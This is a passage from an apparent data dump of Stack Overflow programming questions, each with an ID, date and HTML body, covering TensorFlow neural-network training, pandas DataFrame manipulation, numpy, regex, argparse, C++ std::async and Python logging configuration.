    initial = tf.truncated_normal(shape, stddev=1.0)
    return tf.Variable(initial)

"""""" Creating weights and biases for all layers """"""
theta1 = weights([11,7])
bias1 = bias([1,7])

theta2 = weights([7,7])
bias2 = bias([1,7])

""Last layer""
theta3 = weights([7,3])
bias3 = bias([1,3])


"""""" Hidden layer input (Sum of weights, activation functions and bias)
z = theta^T * activation + bias
""""""
def Z_Layer(activation,theta,bias):
    return tf.add(tf.matmul(activation,theta),bias)

"""""" Creating the sigmoid function 
sigmoid = 1 / (1 + exp(-z))
""""""
def Sigmoid(z):
    return tf.div(tf.constant(1.0),tf.add(tf.constant(1.0), tf.exp(tf.neg(z))))

"""""" hypothesis functions - predicted output """"""    
' layer 1 - input layer '
hyp1 = x
' layer 2 '
z2 = Z_Layer(hyp1, theta1, bias1)
hyp2 = Sigmoid(z2)
' layer 3 '
z3 = Z_Layer(hyp2, theta2, bias2)
hyp3 = Sigmoid(z3)
' layer 4 - output layer '
zL = Z_Layer(hyp3, theta3, bias3)
hypL = tf.add( tf.add(tf.pow(zL,3), tf.pow(zL,2) ), zL)


"""""" Cost function """"""
cost_function = tf.mul( tf.div(0.5, m_training), tf.pow( tf.sub(hypL, y_true), 2)) 

#cross_entropy = -tf.reduce_sum(y_true*tf.log(hypL) + (1-y_true)*tf.log(1-hypL))

"""""" Gradient Descent """"""
train_step = tf.train.GradientDescentOptimizer(learning_rate=0.003).minimize(cost_function)       

""""""    Training and Evaluation     """"""

correct_prediction = tf.equal(tf.arg_max(hypL, 1), tf.arg_max(y_true, 1))

accuracy = tf.reduce_mean(tf.cast(correct_prediction, tf.float32))

sess.run(tf.initialize_all_variables())

keep_prob = tf.placeholder(tf.float32)

"""""" Testing - Initialise lists  """"""
hyp1_test = []
z2_test = []
hyp2_test = []
z3_test = []
hyp3_test = []
zL_test = []
hypL_test = []
cost_function_test =[]
complete_error_test = []
theta1_test = []
theta2_test = []
theta3_test = []
bias1_test = []
bias2_test = []
bias3_test = []
"""""" -------------------------   """"""

complete_error_init = tf.abs(tf.reduce_mean(tf.sub(hypL,y_true),1))

training_error=[]
for j in range_training:
    feedj = {x: soil.input_scale[j], y_true: soil.output_scale[j] , keep_prob: 1.0}

    """""" -------------------------   """"""
    'Testing - adding to list'
    z2_init = z2.eval(feed_dict=feedj)
    z2_test.append(z2_init)

    hyp2_init = hyp2.eval(feed_dict=feedj)
    hyp2_test.append(hyp2_init)

    z3_init = z3.eval(feed_dict=feedj)
    z3_test.append(z3_init)

    hyp3_init = hyp3.eval(feed_dict=feedj)
    hyp3_test.append(hyp3_init)

    zL_init = zL.eval(feed_dict=feedj)
    zL_test.append(zL_init)

    hypL_init = hypL.eval(feed_dict=feedj)
    hypL_test.append(hypL_init)

    cost_function_init = cost_function.eval(feed_dict=feedj)
    cost_function_test.append(cost_function_init)

    complete_error = complete_error_init.eval(feed_dict=feedj)
    complete_error_test.append(complete_error)
    print 'number iterations: %g, error (S1, S2, S3): %g, %g, %g' % (j, complete_error[0], complete_error[1], complete_error[2])

    theta1_init = theta1.eval()
    theta1_test.append(theta1_init)

    theta2_init = theta2.eval()
    theta2_test.append(theta2_init)

    theta3_init = theta3.eval()
    theta3_test.append(theta3_init)

    bias1_init = bias1.eval()
    bias1_test.append(bias1_init)

    bias2_init = bias2.eval()
    bias2_test.append(bias2_init)

    bias3_init = bias3.eval()
    bias3_test.append(bias3_init)
    """""" -------------------------   """"""

    train_accuracy = accuracy.eval(feed_dict=feedj)
    print(""step %d, training accuracy %g"" % (j, train_accuracy))
    train_step.run(feed_dict=feedj)
    training_error.append(1 - train_accuracy)

cv_error=[]    
for k in range_cv:
feedk = {x: soil.input_scale[k], y_true: soil.output_scale[k] , keep_prob: 1.0}
    cv_accuracy = accuracy.eval(feed_dict=feedk)
    print(""cross-validation accuracy %g"" % cv_accuracy)
    cv_error.append(1-cv_accuracy) 

for l in range_test:
    print(""test accuracy %g"" % accuracy.eval(feed_dict={x: soil.input_matrixs[l], y_true: soil.output_matrixs[l], keep_prob: 1.0}))
</code></pre>

<p>The last weeks I was working on a Unit-model for this problem, but the same output occurred. I have no idea what to try next. Hope someone can help me.</p>

<h1>Edit:</h1>

<p>I checked some parameters in detail again. The hypothesis function (hyp) and activation function (z) for layer 3 and 4 (last layer) have the same entries for each data point, i.e. the same value in each line for one column.</p>
"
39934187,3522338.0,2016-10-08 15:34:25+00:00,4,fors in python list comprehension,"<p>Consider I have nested for loop in python list comprehension</p>

<pre><code>&gt;&gt;&gt; data = [[0, 1, 2], [3, 4, 5], [6, 7, 8]]
&gt;&gt;&gt; [y for x in data for y in x]
[0, 1, 2, 3, 4, 5, 6, 7, 8]
&gt;&gt;&gt; [y for y in x for x in data]
[6, 6, 6, 7, 7, 7, 8, 8, 8]
</code></pre>

<p>I can't explain why is that when i change the order of two <code>fors</code> </p>

<pre><code>for y in x
</code></pre>

<p>What's <code>x</code> in second list comprehension?</p>
"
39800223,98080.0,2016-09-30 21:16:18+00:00,4,"Accumulate values of ""neigborhood"" from edgelist with numpy","<p>I have a undirected network where each node can be one of <strong>k</strong> types. For each node <em>i</em>, I need to calculate the number of neighbors that node <em>i</em> has of each type.</p>

<p>Right now I am representing the edges with an edgelist where the columns are indexes of the nodes. The nodes are represented as a <strong>n x k</strong> matrix, where each column represents a node type. If a node is of type <em>k</em> then the <em>k</em>th column's value is 1, 0 otherwise.</p>

<p>Here's my current code, which is correct, but too slow.</p>

<pre><code># example nodes and edges, both typically much longer
nodes = np.array([[0, 0, 1], 
                  [0, 1, 0],                       
                  [1, 0, 0]])
edges = np.array([[0, 1],
                  [1, 2]])

neighbors = np.zeros_like(nodes)

for i, j in edges:
   neighbors[i] += nodes[j]
   neighbors[j] += nodes[i]
</code></pre>

<p>Is there some clever numpy that would allow me to avoid this for loop? If the best way to do this is with an adjacency matrix, that is also acceptable.</p>
"
40137072,1576886.0,2016-10-19 16:37:45+00:00,4,Why is hash() slower under python3.4 vs python2.7,"<p>I was doing some performance evaluation using timeit and discovered a performance degredation between python 2.7.10 and python 3.4.3. I narrowed it down to the <code>hash()</code> function:</p>

<p>python 2.7.10:</p>

<pre><code>&gt;&gt;&gt; import timeit
&gt;&gt;&gt; timeit.timeit('for x in xrange(100): hash(x)', number=100000)
0.4529099464416504
&gt;&gt;&gt; timeit.timeit('hash(1000)')
0.044638872146606445
</code></pre>

<p>python 3.4.3:</p>

<pre><code>&gt;&gt;&gt; import timeit
&gt;&gt;&gt; timeit.timeit('for x in range(100): hash(x)', number=100000)
0.6459149940637872
&gt;&gt;&gt; timeit.timeit('hash(1000)')
0.07708719989750534
</code></pre>

<p>That's an approx. 40% degradation! It doesn't seem to matter if integers, floats, strings(unicodes or bytearrays), etc, are being hashed; the degradation is about the same. In both cases the hash is returning a 64-bit integer. The above was run on my Mac, and got a smaller degradation (20%) on an Ubuntu box.</p>

<p>I've also used PYTHONHASHSEED=random for the python2.7 tests and in <em>some</em> cases, restarting python for each ""case"", I saw the <code>hash()</code> performance get a bit worse, but never as slow as python3.4</p>

<p>Anyone know what's going on here? Was a more-secure, but slower, hash function chosen for python3 ?</p>
"
39751705,4989547.0,2016-09-28 15:25:24+00:00,4,python replace unicode characters,"<p>I wrote a program to read in Windows DNS debugging log, but inside always got some funny characters in the domain field. </p>

<p>Below is one of the example:</p>

<pre>(13)\xc2\xb5\xc2\xb1\xc2\xbe\xc3\xa2p\xc3\xb4\xc2\x8d(5)example(3)com(0)'</pre>

<p>I want to replace all the <code>\x..</code> with a <code>?</code></p>

<p>I explicitly type \xc2 as follows works </p>

<pre><code>line = '(13)\xc2\xb5\xc2\xb1\xc2\xbe\xc3\xa2p\xc3\xb4\xc2\x8d(5)example(3)com(0)'
re.sub('\\\xc2', '?', line)
result: '(13)?\xb5?\xb1?\xbe\xc3\xa2p\xc3\xb4?\x8d(5)example(3)com(0)'
</code></pre>

<p>But its not working if I write as follow:</p>

<p><code>re.sub('\\\x..', '?', line)</code></p>

<p>How I can write a regular expression to replace them all?</p>
"
39719140,1697732.0,2016-09-27 07:55:13+00:00,4,Pyhon - Best way to find the 1d center of mass in a binary numpy array,"<p>Suppose I have the following Numpy array, in which I have one and only one continuous slice of <code>1</code>s:</p>

<pre><code>import numpy as np
x = np.array([0,0,0,0,1,1,1,0,0,0], dtype=1)
</code></pre>

<p>and I want to find the index of the 1D center of mass of the <code>1</code> elements. I could type the following:</p>

<pre><code>idx = np.where( x )[0]
idx_center_of_mass = int(0.5*(idx.max() + idx.min()))
# this would give 5
</code></pre>

<p>(Of course this would lead to rough approximation when the number of elements of the <code>1</code>s slice is even.)
Is there any better way to do this, like a computationally more efficient oneliner?</p>
"
39939741,122536.0,2016-10-09 03:31:45+00:00,4,How do you print a function that returns a request in Python?,"<p>I have a function that gets the profile data of an user:</p>

<p><strong>API.py</strong></p>

<pre><code>def getProfileData(self):
    data = json.dumps({
    '_uuid'        : self.uuid,
    '_uid'         : self.username_id,
    '_csrftoken'   : self.token
    })
    return self.SendRequest('accounts/current_user/?edit=true', self.generateSignature(data))
</code></pre>

<p>I want to print the returned request in the terminal, so I did this:</p>

<p><strong>test.py</strong></p>

<pre><code>from API import API

API = API(""username"", ""password"")
API.login() # login
print(API.getProfileData())
</code></pre>

<p>But nothing is logged in the console.</p>

<p>Maybe I'm doing it the JavaScript way, since that's my background.</p>

<p>What's the correct way to do it?</p>

<p><strong>EDIT:</strong></p>

<p>This is what's inside <code>SendRequest</code>:</p>

<pre><code>def SendRequest(self, endpoint, post = None, login = False):
        if (not self.isLoggedIn and not login):
            raise Exception(""Not logged in!\n"")
            return;

        self.s.headers.update ({'Connection' : 'close',
                                'Accept' : '*/*',
                                'Content-type' : 'application/x-www-form-urlencoded; charset=UTF-8',
                                'Cookie2' : '$Version=1',
                                'Accept-Language' : 'en-US',
                                'User-Agent' : self.USER_AGENT})

        if (post != None): # POST
            response = self.s.post(self.API_URL + endpoint, data=post) # , verify=False
        else: # GET
            response = self.s.get(self.API_URL + endpoint) # , verify=False

        if response.status_code == 200:
            self.LastResponse = response
            self.LastJson = json.loads(response.text)
            return True
        else:
            print (""Request return "" + str(response.status_code) + "" error!"")
            # for debugging
            try:
                self.LastResponse = response
                self.LastJson = json.loads(response.text)
            except:
                pass
            return False

    def getTotalFollowers(self,usernameId):
        followers = []
        next_max_id = ''
        while 1:
            self.getUserFollowers(usernameId,next_max_id)
            temp = self.LastJson

            for item in temp[""users""]:
                followers.append(item)

            if temp[""big_list""] == False:
                return followers            
            next_max_id = temp[""next_max_id""]         

    def getTotalFollowings(self,usernameId):
        followers = []
        next_max_id = ''
        while 1:
            self.getUserFollowings(usernameId,next_max_id)
            temp = self.LastJson

            for item in temp[""users""]:
                followers.append(item)

            if temp[""big_list""] == False:
                return followers            
            next_max_id = temp[""next_max_id""] 

    def getTotalUserFeed(self, usernameId, minTimestamp = None):
        user_feed = []
        next_max_id = ''
        while 1:
            self.getUserFeed(usernameId, next_max_id, minTimestamp)
            temp = self.LastJson
            for item in temp[""items""]:
                user_feed.append(item)
            if temp[""more_available""] == False:
                return user_feed
            next_max_id = temp[""next_max_id""]
</code></pre>
"
39717809,6661895.0,2016-09-27 06:46:12+00:00,4,Insert list into cells which meet column conditions,"<p>Consider <code>df</code></p>

<pre><code>   A  B  C
0  3  2  1
1  4  2  3
2  1  4  1
3  2  2  3
</code></pre>

<p>I want to add another column <code>""D""</code> such that D contains different Lists based on conditions on <code>""A""</code>, <code>""B""</code> and <code>""C""</code></p>

<pre><code>   A  B  C  D
0  3  2  1  [1,0]
1  4  2  3  [1,0]
2  1  4  1  [0,2]
3  2  2  3  [2,0]
</code></pre>

<p>My code snippet looks like:</p>

<pre><code>df['D'] = 0
df['D'] = df['D'].astype(object)

df.loc[(df['A'] &gt; 1) &amp; (df['B'] &gt; 1), ""D""] = [1,0]
df.loc[(df['A'] == 1) , ""D""] = [0,2]
df.loc[(df['A'] == 2) &amp; (df['C'] != 0) , ""D""] = [2,0]
</code></pre>

<p>When I try to run this code it throws the following error:</p>

<pre><code>ValueError: Must have equal len keys and value when setting with an iterable
</code></pre>

<p>I have converted the column into <code>Object</code> type as suggested <a href=""http://stackoverflow.com/questions/26483254/python-pandas-insert-list-into-a-cell"">here</a> but still with error.</p>

<p>What I can infer is that pandas is trying to iterate over the elements of the list and assigns each of those values to the cells where as I am trying to assign the entire list to all the cells meeting the criterion.</p>

<p>Is there any way I can assign lists in the above fashion?</p>
"
40016373,4555249.0,2016-10-13 08:50:56+00:00,4,Python-like multiprocessing in C++,"<p>I am new to C++, and I am coming from a long background of Python. </p>

<p>I am searching for a way to run a function in parallel in C++. I read a lot about <code>std::async</code>, but it is still not very clear for me. </p>

<ol>
<li><p>The following code does some really interesting thing</p>

<pre><code>#include &lt;future&gt;
#include &lt;iostream&gt;

void called_from_async() {
  std::cout &lt;&lt; ""Async call"" &lt;&lt; std::endl;
}

int main() {
  //called_from_async launched in a separate thread if possible
  std::future&lt;void&gt; result( std::async(called_from_async));

  std::cout &lt;&lt; ""Message from main."" &lt;&lt; std::endl;

  //ensure that called_from_async is launched synchronously
  //if it wasn't already launched
  result.get();

  return 0;
}
</code></pre>

<p>If I run it several times sometimes the output is what I expected:</p>

<pre><code>Message from main.
Async call
</code></pre>

<p>But sometimes I get something like this:</p>

<pre><code>MAessysnacg ec aflrlom main.
</code></pre>

<p>Why isnt the <code>cout</code> happens first? I clearly call the <code>.get()</code> method AFTER the <code>cout</code>. </p></li>
<li><p>About the parallel runs. In case I have a code like this:</p>

<pre><code>#include &lt;future&gt;
#include &lt;iostream&gt;
#include &lt;vector&gt;

int twice(int m) {
  return 2 * m;
}

int main() {
  std::vector&lt;std::future&lt;int&gt;&gt; futures;

  for(int i = 0; i &lt; 10; ++i) {
    futures.push_back (std::async(twice, i));
  }

  //retrive and print the value stored in the future
  for(auto &amp;e : futures) {
    std::cout &lt;&lt; e.get() &lt;&lt; std::endl;
  }

  return 0;
}
</code></pre>

<p>All the 10 calls to <code>twice</code> function will run on separate cores simultaneously? </p>

<p>In case not, is there a similar thing in C++ like the Python <em>multiprocess</em> lib? </p>

<p>Mainly what I am searching for:</p>

<p>I write a function, and call it with n number of inputs with ?multiprocessing? and it will run the function 1 times on n nodes at the same time.</p></li>
</ol>
"
40044814,6783741.0,2016-10-14 13:48:03+00:00,4,Python:Update list of tuples,"<p>I have a list of tuples like this:</p>

<p>list =   [(1, 'q'), (2, 'w'), (3, 'e'), (4, 'r')]</p>

<p>and i am trying to create a update function update(item,num) which search the item in the list and then change the num.</p>

<p>for example if i use update(w,6) the result would be </p>

<pre><code>list =   [(1, 'q'), (6, 'w'), (3, 'e'), (4, 'r')]
</code></pre>

<p>i tried this code but i had error</p>

<pre><code>if item in heap:
        heap.remove(item)
        Pushheap(item,num)
    else:
        Pushheap(item,num)
</code></pre>

<p>Pushheap is a function that push tuples in the heap
any ideas?</p>
"
39717407,1934212.0,2016-09-27 06:23:55+00:00,4,Adding items to empty pandas DataFrame,"<p>I want to dynamically extend an empty pandas DataFrame in the following way:</p>

<pre><code>df=pd.DataFrame()
indices=['A','B','C']
colums=['C1','C2','C3']
for colum in colums:
    for index in indices:
        #df[index,column] = anyValue
</code></pre>

<p>Where both indices and colums can have arbitrary sizes which are not known in advance, i.e. I cannot create a DataFrame with the correct size in advance.</p>

<p>Which pandas function can I use for </p>

<pre><code>#df[index,column] = anyValue
</code></pre>

<p>?</p>
"
39909927,4634344.0,2016-10-07 05:19:01+00:00,4,How to print just the content of the help string of a specific argument of ArgParse,"<p>Is there a way to access the help strings for specific arguments of the argument parser library object? </p>

<p>I want to print the help string content if the option was present on the command line. <em>Not</em> the complete help text that Argument Parser can display via ArgumentParser.print_help .</p>

<p>So something along those lines:</p>

<pre><code>parser = argparse.ArgumentParser()

parser.add_argument(""-d"", ""--do_x"", help='the program will do X')

if do_x:
    print(parser.&lt;WHAT DO I HAVE TO PUT HERE?&gt;('do_x')
</code></pre>

<p>And this is the required behavior</p>

<p>$program -d</p>

<blockquote>
  <p>the program will do X</p>
</blockquote>
"
40048323,1948982.0,2016-10-14 16:53:16+00:00,4,Pandas: building a column with self-refrencing past values,"<p>I need to generate a column that starts with an initial value, and then is generated by a function that includes past values of that column. For example</p>

<pre><code>df = pd.DataFrame({'a': [1,1,5,2,7,8,16,16,16]})
df['b'] = 0
df.ix[0, 'b'] = 1
df

    a  b
0   1  1
1   1  0
2   5  0
3   2  0
4   7  0
5   8  0
6  16  0
7  16  0
8  16  0
</code></pre>

<p>Now, I want to generate the rest of the column 'b' by taking the minimum of the previous row and adding two. One solution would be</p>

<pre><code>for i in range(1, len(df)):
    df.ix[i, 'b'] = df.ix[i-1, :].min() + 2
</code></pre>

<p>Resulting in the desired output</p>

<pre><code>    a   b
0   1   1
1   1   3
2   5   3
3   2   5
4   7   4
5   8   6
6  16   8
7  16  10
8  16  12
</code></pre>

<p>Does pandas have a 'clean' way to do this? Preferably one that would vectorize the computation?</p>
"
39990287,4115378.0,2016-10-12 03:58:17+00:00,4,"Create custom date range, 22 hours a day python","<p>I'm working with pandas and want to create a month-long custom date range where the week starts on Sunday night at 6pm and ends Friday afternoon at 4pm. And each day has 22 hours, so for example Sunday at 6pm to Monday at 4pm, Monday 6pm to Tuesday 4pm, etc. </p>

<p>I tried <code>day_range = pd.date_range(datetime(2016,9,12,18),datetime.now(),freq='H')</code> but that always gives me in 24 hours.</p>

<p>Any suggestions?</p>
"
40110468,4792229.0,2016-10-18 14:06:51+00:00,4,How to check if a string contains a dictionary,"<p>I want to recursively parse all values in a dict that are strings with <code>ast.literal_eval(value)</code> but not do that eval if the string doesn't contain a dict. I want this, because I have a string in a dict that is a dict in itself and I would like the value to be a dict. Best to give an example</p>

<pre><code>my_dict = {'a': 42, 'b': ""my_string"", 'c': ""{'d': 33, 'e': 'another string'}""}
</code></pre>

<p>Now I don't want a do to <code>ast.literal_eval(my_dict['c'])</code> I want a generic solution where I can do <code>convert_to_dict(my_dict)</code></p>

<p>I wanted to write my own method, but I don't know how to check if a string contains a dict, and then ast.literal_eval will fail, hence the question.</p>
"
39941128,6690157.0,2016-10-09 07:31:56+00:00,4,Don't show zero values on 2D heat map,"<p>I want to plot a 2D map of a sillicon wafer dies. Hence only the center portion have values and corners have the value 0. I'm using matplotlib's plt.imshow to obtain a simple map as follows:</p>

<pre><code>data = np.array([[ 0. ,  0. ,  1. ,  1. ,  0. ,  0. ],
       [ 0. ,  1. ,  1. ,  1. ,  1. ,  0. ],
       [ 1. ,  2. ,  0.1,  2. ,  2. ,  1. ],
       [ 1. ,  2. ,  2. ,  0.1,  2. ,  1. ],
       [ 0. ,  1. ,  1. ,  1. ,  1. ,  0. ],
       [ 0. ,  0. ,  1. ,  1. ,  0. ,  0. ]])

plt.figure(1)
plt.imshow(data ,interpolation='none')
plt.colorbar()
</code></pre>

<p>And I obtain the following map:
<a href=""http://i.stack.imgur.com/NdOB3.png"" rel=""nofollow""><img src=""http://i.stack.imgur.com/NdOB3.png"" alt=""enter image description here""></a></p>

<p>Is there any way to remove the dark blue areas where the values are zeros while retaining the shape of the 'wafer' (the green, red and lighter blue areas)? Meaning the corners would be whitespaces while the remainder retains the color configuration. </p>

<p>Or is there a better function I could use to obtain this?</p>
"
39798594,6877346.0,2016-09-30 19:14:56+00:00,4,"Take union of two columns, Python + Pandas","<p>I have a df arranged like follows:</p>

<pre><code>   x    y    z
0  a   jj  Nan
1  b   ii   mm
2  c   kk   nn
3  d   ii  NaN
4  e  Nan   oo
5  f   jj   mm
6  g  Nan   nn
</code></pre>

<p>The desired output is:</p>

<pre><code>   x    y    z   w
0  a   jj  Nan   a
1  b   ii   mm   a
2  c   kk   nn   c
3  d   ii  NaN   a
4  e  Nan   oo   e
5  f   jj   mm   a
6  g  Nan   nn   c
</code></pre>

<p>The logic is </p>

<ol>
<li><p>to take union of column y &amp; z : <em><code>ii == jj</code> since in index 1 and 5, they both have <code>mm</code> in column z</em></p></li>
<li><p>group this union : <em>index 0,1,3,5 are a group, index 2,6 are another group</em></p></li>
<li><p>within the group, randomly take one cell in column x and assign it to column w for the whole group</p></li>
</ol>

<p>I have no clue at all about this problem. 
Can somebody help me?</p>

<p><strong>EDITNOTE:</strong></p>

<p>I was first post a perfectly sorted column y and column z like follows:</p>

<pre><code>   x    y    z   w
0  a   ii  NaN   a
1  b   ii   mm   a
2  c   jj   mm   a
3  d   jj  Nan   a
4  e   kk   nn   e
5  f  Nan   nn   e
6  g  Nan   oo   g
</code></pre>

<p>For this case, piRSquared's solution works perfect. </p>

<p><strong>EDITNOTE2:</strong> </p>

<p>Nickil Maveli's solution works perfect for my problem. However, I noted that there's a situation that the solution can not handle, that is :</p>

<pre><code>   x   y   z
0  a  ii  mm
1  b  ii  nn
2  c  jj  nn
3  d  jj  oo
4  e  kk  oo
</code></pre>

<p>By Nickil Maveli's solution, the result would be like follows:</p>

<pre><code>   0   1   2  w
0  a  ii  mm  a
1  b  ii  mm  a
2  c  jj  nn  c
3  d  jj  nn  c
4  e  kk  oo  e
</code></pre>

<p>However, the desired output should be w = ['a', 'a', 'a', 'a', 'a']. </p>
"
39988379,3612634.0,2016-10-11 23:38:26+00:00,4,"(Python) Can I store the functions themselves, but not their value, in a list","<p>As you can see from the code below, I'm adding a series of functions to a list.
The result is that each function gets ran and the returned value is added to the list. </p>

<pre><code>foo_list = []
foo_list.append(bar.func1(100))
foo_list.append(bar.func2([7,7,7,9]))
foo_list.append(bar.func3(r'C:\Users\user\desktop\output'))
</code></pre>

<p>What I would like to know is, is it possible to have the function stored in the list and then ran when it is iterated upon in a for loop?</p>

<p><a href=""https://i.stack.imgur.com/MS9ml.png"" rel=""nofollow""><img src=""https://i.stack.imgur.com/MS9ml.png"" alt=""enter image description here""></a></p>
"
39937160,6941046.0,2016-10-08 20:40:43+00:00,4,What's the most efficient way to find factors in a list?,"<h2>What I'm looking to do:</h2>

<p>I need to make a function that, given a list of positive integers (there can be duplicate integers), counts all triples (in the list) in which the third number is a multiple of the second and the second is a multiple of the first:</p>

<p>(The same number cannot be used twice in one triple, but can be used by all other triples)</p>

<p>For example, <code>[3, 6, 18]</code> is one because <code>18</code> goes evenly into <code>6</code> which goes evenly into <code>3</code>.</p>

<p>So given <code>[1, 2, 3, 4, 5, 6]</code> it should find:</p>

<pre><code>[1, 2, 4] [1, 2, 6] [1, 3, 6]
</code></pre>

<p>and return <code>3</code> (the number of triples it found)</p>

<h2>What I've tried:</h2>

<p>I made a couple of functions that work but are not efficient enough. Is there some math concept I don't know about that would help me find these triples faster? A module with a function that does better? I don't know what to search for...</p>

<pre><code>def foo(q):
    l = sorted(q)
    ln = range(len(l))
    for x in ln:
        if len(l[x:]) &gt; 1:
            for y in ln[x + 1:]:
                if (len(l[y:]) &gt; 0) and (l[y] % l[x] == 0):
                    for z in ln[y + 1:]:
                        if l[z] % l[y] == 0:
                            ans += 1
    return ans
</code></pre>

<p>This one is a bit faster:</p>

<pre><code>def bar(q):
    l = sorted(q)
    ans = 0
    for x2, x in enumerate(l):
        pool = l[x2 + 1:]
        if len(pool) &gt; 1:
            for y2, y in enumerate(pool):
                pool2 = pool[y2 + 1:]
                if pool2 and (y % x == 0):
                    for z in pool2:
                        if z % y == 0:
                            ans += 1
    return ans
</code></pre>

<p>Here's what I've come up with with help from y'all but I must be doing something wrong because it get's the wrong answer (it's really fast though):</p>

<pre><code>def function4(numbers):
    ans = 0
    num_dict = {}
    index = 0
    for x in numbers:
        index += 1
        num_dict[x] = [y for y in numbers[index:] if y % x == 0]

    for x in numbers:
        for y in num_dict[x]:
            for z in num_dict[y]:
                print(x, y, z)
                ans += 1

    return ans
</code></pre>

<p>(<code>39889</code> instead of <code>40888</code>) - oh, I accidentally made the index var start at 1 instead of 0. It works now.</p>

<h1>Final Edit</h1>

<p>I've found the best way to find the number of triples by reevaluating what I needed it to do. This method doesn't actually find the triples, it just counts them.</p>

<pre><code>def foo(l):
    llen = len(l)
    total = 0
    cache = {}
    for i in range(llen):
        cache[i] = 0
    for x in range(llen):
        for y in range(x + 1, llen):
            if l[y] % l[x] == 0:
                cache[y] += 1
                total += cache[x]
    return total
</code></pre>

<p>And here's a version of the function that explains the thought process as it goes (not good for huge lists though because of spam prints):</p>

<pre><code>def bar(l):
    list_length = len(l)
    total_triples = 0
    cache = {}
    for i in range(list_length):
        cache[i] = 0
    for x in range(list_length):
        print(""\n\nfor index[{}]: {}"".format(x, l[x]))
        for y in range(x + 1, list_length):
            print(""\n\ttry index[{}]: {}"".format(y, l[y]))
            if l[y] % l[x] == 0:
                print(""\n\t\t{} can be evenly diveded by {}"".format(l[y], l[x]))
                cache[y] += 1
                total_triples += cache[x]
                print(""\t\tcache[{0}] is now {1}"".format(y, cache[y]))
                print(""\t\tcount is now {}"".format(total_triples))
                print(""\t\t(+{} from cache[{}])"".format(cache[x], x))
            else:
                print(""\n\t\tfalse"")
    print(""\ntotal number of triples:"", total_triples)
</code></pre>
"
39860158,5032130.0,2016-10-04 19:20:37+00:00,4,How can I get subgroups of the match in Scala?,"<p>I have the following in python:</p>

<pre><code>  regex.sub(lambda t: t.group(1).replace("" "", ""  "") + t.group(2),string)    
</code></pre>

<p>where <code>regex</code> is a Regular Expression and <code>string</code> is a filled String. </p>

<p>So I am trying to do the same in Scala, using <code>regex.replaceAllIn(...)</code> function instead of python<code>sub</code>. However, I don't know how to get the subgroups that match.</p>

<p>Is there something similar to python function <code>group</code> in Scala?</p>
"
40077188,941759.0,2016-10-17 01:07:02+00:00,4,Pandas - Data Frame - Reshaping Values in Data Frame,"<p>I am new to Pandas and have a data frame with a team's score in 2 separate columns. This is what I have.</p>

<pre><code>Game_ID Teams   Score

1    Team A  95
1    Team B  85
2    Team C  90
2    Team D  72
</code></pre>

<p>This is where I would like to get to and then ideally to.</p>

<pre><code>1   Team A  95 Team B  94
2   Team C  90 Team B  72 
</code></pre>
"
39609391,2821224.0,2016-09-21 06:53:53+00:00,4,Pandas how to split dataframe by column by interval,"<p>I have a gigantic dataframe with a datetime type column called <code>dt</code>, the data frame is sorted based on <code>dt</code> already. I want to split the dataframe into several dataframes based on <code>dt</code>, each dataframe contains rows within <code>1 hr</code> range.</p>

<p>Split</p>

<pre><code>   dt                    text
0  20160811 11:05        a
1  20160811 11:35        b
2  20160811 12:03        c
3  20160811 12:36        d
4  20160811 12:52        e
5  20160811 14:32        f
</code></pre>

<p>into </p>

<pre><code>   dt                    text
0  20160811 11:05        a
1  20160811 11:35        b
2  20160811 12:03        c

   dt                    text
0  20160811 12:36        d
1  20160811 12:52        e

   dt                    text 
0  20160811 14:32        f
</code></pre>
"
39712435,440732.0,2016-09-26 21:09:26+00:00,4,sum of 'float64' column type in pandas return float instead of numpy.float64,"<p>I have a dataframe in pandas. I am taking sum of a column of a dataframe as:</p>

<pre><code>x = data['col1'].sum(axis=0)
print(type(x))
</code></pre>

<p>I have checked that <code>col1</code> column in <code>data</code> dataframe is of type <code>float64</code>. But the type of <code>x</code> is <code>&lt;class 'float'&gt;</code>. I was expecting the type of <code>x</code> to be <code>numpy.float64</code>.</p>

<p>What is it that I am missing here?</p>

<p>pandas version - '0.18.0', numpy version - '1.10.4', python version - 3.5.2</p>
"
39806992,6908607.0,2016-10-01 13:09:09+00:00,4,Obtain plot data from JPEG or png file,"<p>I'm writing a program that obtains plot data from a graph(JPEG).
Vertical axis is logarithmic.
I successfully made a program that understands horizontal and vertical axes as linear (not logarithmic), see the code below:</p>

<h2><img src=""http://i.stack.imgur.com/Qx3JF.png"" alt=""enter image description here""></h2>

<pre><code>%matplotlib inline

from PIL import Image
from scipy import *
from pylab import *

im = array(Image.open('fig1.jpg'))

hh = im.shape[0]
ww = im.shape[2]

imshow(im)    
print(im[100,0,:])

Col = array([255,0,0])#èµ¤
bnd = 30

yax = linspace(0.5,2e-4,hh)
xax = linspace(1,14,ww)

for i in range(hh):
    for j in range(ww):
        im[i,j,:] = 255*(any(im[i,j,:]&gt;Col+bnd) or any(im[i,j,:]&lt;Col-bnd))

mapim = abs(im[:,:,0]/255-1).astype(bool)

yval = array([average(yax[mapim[:,t]]) for t in range(ww)])

rlt = interp(range(100),xax,yval)
</code></pre>

<p>I have no idea how to modify it to make it understand logarithmic axis.
Please help me.</p>
"
39976715,1935987.0,2016-10-11 11:57:16+00:00,4,Python 3.5.2 logger configuration and usage,"<p>I'm new to python and trying to setup a logger in my simple app.</p>

<p>This is the app structure:</p>

<pre><code> - checker
      - checking
         - proxy_checker.py
      - custom_threading
         - __init__.py
         - executor_my.py
         - long_task.py
      - tests
      - __init__.py
      - logging_config.ini
      - main.py
</code></pre>

<p>i'm trying to setup the file configured logger 
in the main module's <code>checker/__init__.py</code><strong>:</strong></p>

<pre><code>from logging.config import fileConfig

fileConfig('logging_config.ini')
</code></pre>

<p><strong>logging_config.ini</strong></p>

<pre><code>[loggers]
keys=root

[handlers]
keys=stream_handler

[formatters]
keys=formatter

[logger_root]
level=DEBUG
handlers=stream_handler

[handler_stream_handler]
class=StreamHandler
level=DEBUG
formatter=formatter
args=(sys.stderr,)

[formatter_formatter]
format=%(asctime)s %(name)-12s %(levelname)-8s %(message)s
</code></pre>

<p>and the use it in the <code>/checker/custom_threading/exector_my.py</code>:</p>

<pre><code>import concurrent.futures
import logging

from custom_threading.long_task import LongTask


class MyExecutor(object):
    logger = logging.getLogger(__name__)
    _executor = concurrent.futures.ThreadPoolExecutor(max_workers=500)

    def __init__(self, thread_count, task):
        self._thread_count = thread_count
        self._task = LongTask(task)
        pass

    def start(self):
        self.logger.debug(""Launching with thread count: "" + str(self._thread_count))

*more irrelevant code*
</code></pre>

<p>tried to use logger.info / logger.debug.
